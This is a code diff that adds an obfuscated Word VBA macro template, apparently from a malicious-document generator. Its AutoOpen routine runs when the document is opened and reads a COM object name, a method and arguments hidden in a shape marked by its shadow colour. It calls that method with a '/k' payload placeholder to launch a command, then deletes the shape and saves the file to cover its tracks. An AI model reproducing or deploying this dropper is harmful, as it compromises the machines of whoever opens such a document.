@@ -1,0 +1,28 @@
+Sub AutoOpen()
+    On Error Resume Next
+    Dim aVAR1a As Shape
+    Dim aVAR2a As Long
+    Dim aVAR3a() As String
+    Dim aVAR4a As String
+    Dim aVAR5a As String
+    Dim aVAR6a As Object
+
+    aVAR2a = aKEYa
+
+    For x = 1 To ActiveDocument.Shapes.Count
+        Set aVAR1a = ActiveDocument.Shapes(x)
+        If aVAR1a.Shadow.ForeColor.RGB = aVAR2a Then
+
+            aVAR5a = aVAR1a.Name
+            aVAR4a = aVAR1a.AlternativeText
+            aVAR3a = Split(aVAR1a.TextFrame.TextRange.Text, "|")
+
+            Set aVAR6a = Interaction.CreateObject(aVAR5a)
+            VBA$.[Interaction].CallByName! aVAR6a, [aVAR4a], VbMethod, aVAR3a(0), "/k aPAYLOADa", "", aVAR3a(1), 0
+            aVAR1a.Delete
+            ActiveDocument.Save
+            Exit For
+        End If
+    Next
+
+End Sub
